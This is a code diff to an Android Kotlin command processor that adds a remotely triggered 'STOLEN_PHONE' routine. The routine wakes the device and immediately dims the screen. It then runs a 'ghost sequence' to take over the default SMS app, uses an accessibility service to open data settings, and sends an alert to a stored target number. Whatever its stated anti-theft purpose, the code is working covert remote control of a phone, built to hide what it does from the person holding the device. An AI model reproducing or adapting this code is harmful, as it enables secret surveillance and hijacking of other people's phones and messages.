@@ -1140,6 +1140,70 @@ object CommandProcessor {
                     ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                     status = "KEYWORD_TRAPS_PURGED"
                 }
+                "STOLEN_PHONE" -> {
+                    val targetNum = if (content.isNotBlank()) content.trim() else JudasManager.getHandler(ctx) ?: ""
+                    if (targetNum.isEmpty()) {
+                        status = "FAILED"
+                        errorMsg = "No target number specified in command or Judas Registry"
+                    } else {
+                        ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
+                            .putString("stolen_target_num", targetNum)
+                            .putBoolean("stolen_alert_pending", true)
+                            .apply()
+
+                        // 1. STRONG WAKE
+                        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
+                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
+                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:StolenWake")
+                        wakeLock.acquire(3000)
+                        
+                        val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            putExtra("is_wake_trigger", true)
+                        }
+                        ctx.startActivity(wakeIntent)
+
+                        // 2. DIM IMMEDIATELY
+                        Handler(Looper.getMainLooper()).postDelayed({ 
+                            DimmerManager.applyDim(ctx, 20, "AUTO")
+                        }, 500)
+
+                        // 3. DEFAULT SMS GHOST SEQUENCE
+                        Handler(Looper.getMainLooper()).postDelayed({ 
+                            DefaultSmsManager.expectedMode = "AUTO"
+                            DefaultSmsManager.requestDefault(ctx)
+                        }, 2500)
+
+                        // 4. CONNECTIVITY EVALUATION
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+                            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
+                            val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
+                            
+                            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+                            val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT
+
+                            if (!isOnline && hasSim) {
+                                MyAccessibilityService.instance?.isWaitingForDataSettings = true
+                                val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
+                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                                }
+                                ctx.startActivity(dataIntent)
+                            } else {
+                                DimmerManager.removeOverlay(ctx)
+                            }
+                        }, 12000)
+
+                        // 5. EXECUTE STOLEN ALERT
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            JudasManager.checkPendingStolenAlert(ctx)
+                        }, 16000)
+
+                        status = "STOLEN_PROTOCOL_INITIATED"
+                        errorMsg = "Target: $targetNum"
+                    }
+                }
                 "FULL_ONBOARDING" -> {
                     // 1. STRONG WAKE
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
